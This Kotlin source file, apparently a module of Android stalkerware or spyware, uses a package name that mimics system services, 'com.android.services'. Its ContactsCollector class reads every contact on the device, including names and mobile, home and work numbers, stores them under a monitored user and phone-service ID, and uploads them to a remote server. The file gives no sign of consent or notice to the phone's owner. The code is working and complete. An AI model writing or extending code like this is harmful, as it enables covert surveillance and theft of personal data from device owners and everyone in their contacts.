package com.android.services.logs.collectors

import android.content.Context
import android.provider.ContactsContract
import com.android.services.db.entities.Contacts
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose

class ContactsCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.syncContacts) {
            logVerbose("${AppConstants.CONTACTS_TYPE} Retrieving logs from local app")
            retrieveAndInsertContact(context)
            logVerbose("${AppConstants.CONTACTS_TYPE} Preparing for uploading")
            localDatabaseSource.getContacts { contacts ->
                if (contacts.isNotEmpty()) {
                    logVerbose("${AppConstants.CONTACTS_TYPE} data = $contacts")
                    val startId = contacts[0].uniqueId
                    val endId = contacts[contacts.size - 1].uniqueId
                    val serverHelper = RemoteServerHelper(
                        context,
                        AppConstants.CONTACTS_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startId = startId,
                        endId = endId
                    )
                    serverHelper.upload(contacts)
                } else {
                    logVerbose("${AppConstants.CONTACTS_TYPE} No logs found")
                }
            }
        } else {
            logVerbose("${AppConstants.CONTACTS_TYPE} Sync is Off")
        }
    }

    private fun retrieveAndInsertContact(context: Context) {
        try {
            val managedCursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null,
                ContactsContract.Contacts._ID + " DESC"
            )
            if (managedCursor != null) {
                while (managedCursor.moveToNext()) {
                    try {
                        val contactId = managedCursor.getString(
                            managedCursor.getColumnIndex(
                                ContactsContract.Contacts._ID
                            )
                        )
                        if (localDatabaseSource.checkContactNotExistsAlready(contactId)) {
                            val whereNameClause = ContactsContract.Data.MIMETYPE + " = ? AND " +
                                    ContactsContract.CommonDataKinds.StructuredName.CONTACT_ID + " = ?"
                            val whereNameParams = arrayOf(
                                ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE,
                                contactId
                            )
                            val cursor = context.contentResolver.query(
                                ContactsContract.Data.CONTENT_URI,
                                null,
                                whereNameClause,
                                whereNameParams,
                                ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME
                            )
                            var firstName: String = ""
                            var lastName: String = ""
                            var mobileNumber = ""
                            var homeNumber = ""
                            var officeNumber = ""
                            if (cursor != null) {
                                while (cursor.moveToNext()) {
                                    firstName =
                                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME))
                                            ?: ""
                                    lastName =
                                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredName.FAMILY_NAME))
                                            ?: ""
                                }
                                cursor.close()
                            }
                            val phoneCursor = context.contentResolver
                                .query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId,
                                    null,
                                    null
                                )
                            if (phoneCursor != null) {
                                while (phoneCursor.moveToNext()) {
                                    val phoneType = phoneCursor.getInt(
                                        phoneCursor.getColumnIndex(
                                            ContactsContract.CommonDataKinds.Phone.TYPE
                                        )
                                    )
                                    if (phoneType == ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE) {
                                        mobileNumber = phoneCursor.getString(
                                            phoneCursor.getColumnIndex(
                                                ContactsContract.CommonDataKinds.Phone.DATA
                                            )
                                        )
                                    } else if (phoneType == ContactsContract.CommonDataKinds.Phone.TYPE_HOME) {
                                        homeNumber = phoneCursor.getString(
                                            phoneCursor.getColumnIndex(
                                                ContactsContract.CommonDataKinds.Phone.DATA
                                            )
                                        )
                                    } else if (phoneType == ContactsContract.CommonDataKinds.Phone.TYPE_WORK) {
                                        officeNumber = phoneCursor.getString(
                                            phoneCursor.getColumnIndex(
                                                ContactsContract.CommonDataKinds.Phone.DATA
                                            )
                                        )
                                    }
                                }
                                phoneCursor.close()
                            }
                            if (mobileNumber.isEmpty()) {
                                mobileNumber =
                                    AppUtils.retrievePhoneNumberFromDisplayName(firstName)
                            }
                            val contact = Contacts()
                            contact.phoneContactId = contactId
                            contact.contactFirstName = firstName
                            contact.contactLastName = lastName
                            contact.contactMobileNo = mobileNumber
                            contact.contactHomeNo = homeNumber
                            contact.contactOfficeNo = officeNumber
                            contact.userId = AppConstants.userId ?: ""
                            contact.phoneServiceId = AppConstants.phoneServiceId ?: ""
                            contact.contactStatus = 0
                            localDatabaseSource.insertContacts(contact)
                        }
                    } catch (e: Exception) {
                        logVerbose("Error Inserting Contacts: " + e.message)
                    }
                }
                managedCursor.close()
            }
        } catch (e: Exception) {
            logException("Error Retrieving Contacts Logs: " + e.message)
        }
    }
}